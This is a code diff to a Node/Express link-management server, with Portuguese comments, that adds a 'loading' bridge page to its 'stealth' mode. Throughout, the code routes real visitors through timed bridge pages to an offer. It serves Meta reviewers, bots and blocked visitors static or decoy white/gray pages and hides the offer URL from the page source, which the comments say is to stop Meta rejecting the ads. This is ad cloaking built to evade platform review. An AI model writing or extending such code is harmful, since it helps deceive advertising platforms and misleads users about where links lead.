@@ -20,7 +20,7 @@ const { normalizeAllowedBlockedCountries } = require('./services/siteService');
 const { createMetricsService } = require('./services/metricsService');
 const { createTelegramService } = require('./services/telegramService');
 const { createFallbackService } = require('./services/fallbackService');
-const { getStealthPagePack, getStealthWhiteGrayPack, listStealthThemes, resolveThemeKey, buildInviteBridgeHtml, normalizeImageUrl } = require('./services/stealthPageTemplates');
+const { getStealthPagePack, getStealthWhiteGrayPack, listStealthThemes, resolveThemeKey, buildInviteBridgeHtml, buildLoadingBridgeHtml, normalizeImageUrl } = require('./services/stealthPageTemplates');
 
 const app = express();
 app.disable('x-powered-by');
@@ -1586,16 +1586,22 @@ app.put('/api/sites/:siteId', async (req, res) => {
       invitePageId = null;
     } else if (data.bridge_style != null && String(data.bridge_style).trim() !== '') {
       bridgeStyle = normalizeBridgeStyle(data.bridge_style);
-      invitePageId = bridgeStyle === 'invite'
-        ? (data.invite_page_id !== undefined ? resolveOptionalPageId(data.invite_page_id) : existing.invite_page_id)
-        : (data.invite_page_id !== undefined ? resolveOptionalPageId(data.invite_page_id) : existing.invite_page_id);
+      if (bridgeStyle === 'invite') {
+        invitePageId = data.invite_page_id !== undefined ? resolveOptionalPageId(data.invite_page_id) : existing.invite_page_id;
+      } else if (bridgeStyle === 'loading') {
+        invitePageId = null;
+      } else {
+        invitePageId = data.invite_page_id !== undefined ? resolveOptionalPageId(data.invite_page_id) : existing.invite_page_id;
+      }
     } else {
       const prev = String(existing.bridge_style || '').toLowerCase().trim();
       if (prev === 'invite' || prev === '1' || prev === 'true' || prev === 'on') {
         bridgeStyle = 'invite';
+      } else if (prev === 'loading' || prev === 'load') {
+        bridgeStyle = 'loading';
       } else if (prev === 'editorial' || prev === 'off') {
         bridgeStyle = 'editorial';
-      } else if (existing.invite_page_id || existing.influencer_name || existing.influencer_photo_url) {
+      } else if (existing.invite_page_id) {
         bridgeStyle = 'invite';
       } else {
         bridgeStyle = 'editorial';
@@ -1686,7 +1692,12 @@ app.put('/api/sites/:siteId/invite', async (req, res) => {
   try {
     const bridgeStyle = normalizeBridgeStyle(req.body.bridge_style != null ? req.body.bridge_style : 'editorial');
     let invitePageId = resolveOptionalPageId(req.body.invite_page_id);
-    if (bridgeStyle !== 'invite') {
+    if (bridgeStyle === 'loading') {
+      await db.run(
+        `UPDATE sites SET bridge_style = ?, invite_page_id = NULL WHERE site_id = ?`,
+        ['loading', req.params.siteId]
+      );
+    } else if (bridgeStyle !== 'invite') {
       const pageIdOff = req.body.invite_page_id !== undefined
         ? resolveOptionalPageId(req.body.invite_page_id)
         : site.invite_page_id;
@@ -2701,17 +2712,22 @@ function shouldSoftRedirectOffer(site) {
   return false; // substituído pela ponte unificada no modo stealth
 }
 
-/** Ponte de convite — ligada no link ou com página/influencer vinculado. */
-function usesInviteBridge(site) {
+/** Ponte carregando — só quando bridge_style=loading (opt-in por link). */
+function usesLoadingBridge(site) {
   if (!site || !wantsStealthBehavior(site)) return false;
   const style = String(site.bridge_style || '').toLowerCase().trim();
-  if (style === 'editorial' || style === 'off' || style === '0' || style === 'false') {
-    return !!(site.invite_page_id);
-  }
+  return style === 'loading' || style === 'load';
+}
+
+/** Ponte convite — só quando bridge_style=invite ou legado explícito. */
+function usesInviteBridge(site) {
+  if (!site || !wantsStealthBehavior(site)) return false;
+  if (usesLoadingBridge(site)) return false;
+  const style = String(site.bridge_style || '').toLowerCase().trim();
+  if (style === 'editorial' || style === 'off' || style === '0' || style === 'false') return false;
   if (style === 'invite' || style === '1' || style === 'true' || style === 'on') return true;
-  if (style === 'loading' || style === 'load') return !!(site.invite_page_id);
-  if (site.invite_page_id) return true;
-  if (site.influencer_name || site.influencer_photo_url) return true;
+  // Legado: sem bridge_style definido mas com página de convite
+  if (!style && site.invite_page_id) return true;
   return false;
 }
 
@@ -2723,6 +2739,7 @@ function clampBridgeTimer(sec) {
 
 function normalizeBridgeStyle(v) {
   const s = String(v || '').toLowerCase().trim();
+  if (s === 'loading' || s === 'load') return 'loading';
   if (s === 'invite' || s === '1' || s === 'true' || s === 'on') return 'invite';
   return 'editorial';
 }
@@ -2753,13 +2770,25 @@ async function sendInviteBridgeResponse(res, site, options = {}) {
   const prefix = options.prefix || '';
   const code = options.code || '';
   const navPath = (prefix && code) ? ('/api/n/' + prefix + '/' + code) : '';
-  // NUNCA passa destUrl (oferta) no HTML — Meta lê o fonte e rejeita o ads.
   const html = buildInviteBridgeHtml({
     influencerName: cfg.influencerName,
     photoUrl: cfg.photoUrl,
     bannerUrl: cfg.bannerUrl,
     timerSeconds: cfg.timerSeconds,
     destUrl: '',
+    navPath: options.withTimer ? navPath : '',
+    withTimer: !!options.withTimer
+  });
+  sendStealthHtmlResponse(res, html, { metaSafe: !!options.metaSafe });
+}
+
+async function sendLoadingBridgeResponse(res, site, options = {}) {
+  const prefix = options.prefix || '';
+  const code = options.code || '';
+  const navPath = (prefix && code) ? ('/api/n/' + prefix + '/' + code) : '';
+  const timerSec = Math.max(2, Math.min(4, clampBridgeTimer(site.bridge_timer_sec) || 3));
+  const html = buildLoadingBridgeHtml({
+    timerSeconds: timerSec,
     navPath: options.withTimer ? navPath : '',
     withTimer: !!options.withTimer
   });
@@ -4351,17 +4380,14 @@ async function handleStealthLinkGet(req, res, site) {
 
   const delivery = await resolveStealthDelivery(site, ctx);
 
-  // Convite ligado:
-  // - Lead liberado: convite + timer → /api/n/ (oferta só no JSON, nunca no HTML)
-  // - Meta/bot/bloqueado: mesmo convite ESTÁTICO (sem timer, sem URL de oferta no fonte)
+  const isLeadOffer = delivery.kind === 'soft_redirect' || delivery.kind === 'redirect' || delivery.kind === 'offer';
+  const bridgeOpts = { prefix, code, withTimer: isLeadOffer, metaSafe: !isLeadOffer };
+
+  if (usesLoadingBridge(site)) {
+    return sendLoadingBridgeResponse(res, site, bridgeOpts);
+  }
   if (usesInviteBridge(site)) {
-    const isLeadOffer = delivery.kind === 'soft_redirect' || delivery.kind === 'redirect' || delivery.kind === 'offer';
-    return sendInviteBridgeResponse(res, site, {
-      prefix,
-      code,
-      withTimer: isLeadOffer,
-      metaSafe: !isLeadOffer
-    });
+    return sendInviteBridgeResponse(res, site, bridgeOpts);
   }
 
   // Sem convite: lead → oferta; bot → white/gray (Meta nunca recebe 302 da oferta)
